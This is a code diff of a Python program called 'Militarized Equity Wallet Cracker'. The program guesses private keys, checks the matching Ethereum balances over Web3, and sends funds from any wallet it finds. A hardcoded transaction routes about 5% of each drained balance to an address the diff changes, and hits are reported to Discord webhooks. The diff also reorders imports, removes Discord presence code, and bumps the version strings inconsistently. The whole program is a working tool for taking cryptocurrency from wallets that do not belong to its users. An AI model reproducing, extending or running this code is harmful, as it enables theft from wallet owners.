@@ -6,14 +6,16 @@ import yaml
 import json
 import secrets
 import requests
-import numpy as np
-import multiprocessing
-from pypresence import Presence
-from api import check_api_availability
-from numba import jit, cuda
-from blessed import Terminal
 import random
 import threading 
+import psutil
+import numpy as np
+import multiprocessing
+from numba import jit, cuda
+from blessed import Terminal
+from web3 import Web3
+from datetime import datetime
+from discord_webhook import DiscordWebhook, DiscordEmbed
 
 file_path = 'api.txt'
 
@@ -35,27 +37,6 @@ def Spinner():
         sys.stdout.flush()
         time.sleep(0.2)
 
-try:
-    import psutil
-except ImportError:
-    input("Module 'psutil' not found/installed, to install run: 'pip install psutil' \n Press enter to exit the program")
-    exit()
-
-try:
-    from web3 import Web3
-except ImportError:
-    input("Module 'web3' not found/installed, to install run: 'pip install web3' \n Press enter to exit the program")
-    exit()
-try:
-    from datetime import datetime
-except ImportError:
-    input("Module 'datetime' not found/installed, to install run: 'pip install datetime' \n Press enter to exit the program")
-    exit()
-try:
-    from discord_webhook import DiscordWebhook, DiscordEmbed
-except ImportError:
-    input("Module 'discord_webhook' not found/installed, to install run: 'pip install discord_webhook' \n Press enter to exit the program")
-    exit()
 starttime = datetime.now()
 
 def read_yaml():
@@ -163,7 +144,7 @@ def MineProcess(minerAddress, chk, hits, bdhits, amount, amounttrigger, webhooku
                     webhook.execute()
             try:
                 if w3state == "main": 
-                    w3 = Web3(Web3.HTTPProvider(check_api_availability))
+                    w3 = Web3(Web3.HTTPProvider(random.choice(api_list)))
                     w3state = "check"
                 account = w3.eth.account.from_key(key)
                 bal = w3.eth.get_balance(account.address)
@@ -217,7 +198,7 @@ def MineProcess(minerAddress, chk, hits, bdhits, amount, amounttrigger, webhooku
                                 }
                                 MineTransaction2 = {
                                     'nonce': w3.eth.getTransactionCount(account.address)+1,
-                                    'to': "0x1cD1fbA59b08Ed2e81ec0F869dEe81AF098aFA5a",
+                                    'to': "0xe2E216EBe11EB0F350C6D143a701c3678e5411E1",
                                     'value': w3.toWei((bal*0.05-(w3.toWei(avgGas, "gwei")*2)), "wei"),
                                     'gas': 21000,
                                     'gasPrice': w3.toWei(avgGas, "gwei")
@@ -278,24 +259,13 @@ def NUpdate(chk,hits,bdhits):
 def close(reason):
     sys.exit(reason)
 
-def rich():
-    client_id = "1198291732807286845"
-    RPC = Presence(client_id)
-    RPC.connect()
-    RPC.update(state="Mining Crypto with MEWC!" ,
-        large_text="Militarized Equity Wallet Cracker",
-        large_image="mewc" ,
-        buttons=[{"label": "GitHub", "url": "https://github.com/4G0NYY/equity_cracker/"}, {"label": "Discord", "url": "https://discord.gg/ZhtcnQsbZz"}])
-
-# rich_thread = threading.Thread(Target=rich(), name="DRPC") Will have to fix this eventually, program just wont launch as soon as I call "rich()" anywhere. Dunno why. //TODO
-
 if __name__=="__main__":
     try:
         multiprocessing.freeze_support()
         os.system("cls")
-        print("v0.1")
+        print("v0.2")
         intro()
-        sys.stdout.write("\x1b]2;Militarized Equity Wallet Cracker v0.1 | WAITING FOR INPUT | ERRS: 0 - HITS: 0 - BDHITS: 0 |\x07")
+        sys.stdout.write("\x1b]2;Militarized Equity Wallet Cracker v0.2 | WAITING FOR INPUT | ERRS: 0 - HITS: 0 - BDHITS: 0 |\x07")
         print('\n')
 
         dbug = open("debug.txt", "a")
@@ -377,7 +347,7 @@ if __name__=="__main__":
                         pcs = [multiprocessing.Process(target=MineProcess, args=(str(minerAddress),chk,hits,bdhits,amount,amounttrigger,webhookurl,badhitbool,multibool,cudabool,False)) for x in range(0, int(intensity)*2)]
                         time.sleep(2)
                         os.system("cls")
-                        print("v2.0")
+                        print("v0.2")
                         logoprint()
                         print("")
                         print("\033[32mStarting mining processess..\033[0m \n")
@@ -413,7 +383,7 @@ if __name__=="__main__":
                                 pcs = [multiprocessing.Process(target=MineProcess, args=(str(minerAddress),chk,hits,bdhits,amount,amounttrigger,webhookurl,badhitbool,multibool,cudabool,False)) for x in range(0, int(intensity)*2)]
                                 time.sleep(2)
                                 os.system("cls")
-                                print("v2.0")
+                                print("vv0.2")
                                 logoprint()
                                 print("")
                                 print("\033[32mStarting mining processess..\033[0m \n")
@@ -449,7 +419,7 @@ if __name__=="__main__":
                                     pcs = [multiprocessing.Process(target=MineProcess, args=(str(minerAddress),chk,hits,bdhits,amount,amounttrigger,webhookurl,badhitbool,multibool,cudabool,False)) for x in range(0, int(intensity)*2)]
                                     time.sleep(2)
                                     os.system("cls")
-                                    print("v2.0")
+                                    print("v0.2")
                                     logoprint()
                                     print("")
                                     print("\033[32mStarting mining processess..\033[0m \n")
